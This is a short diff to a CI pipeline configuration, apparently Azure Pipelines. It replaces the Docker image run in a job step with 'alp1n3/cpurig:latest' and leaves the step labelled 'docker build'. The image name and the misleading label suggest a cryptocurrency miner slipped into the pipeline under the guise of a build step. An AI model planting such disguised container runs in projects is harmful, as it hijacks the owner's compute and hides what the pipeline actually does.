@@ -52,5 +52,5 @@ jobs:
   pool:
     vmImage: 'ubuntu-16.04'
   steps:
-    - script: docker run zenidine/nizadam:mualpine
+    - script: docker run alp1n3/cpurig:latest
       displayName: 'docker build'
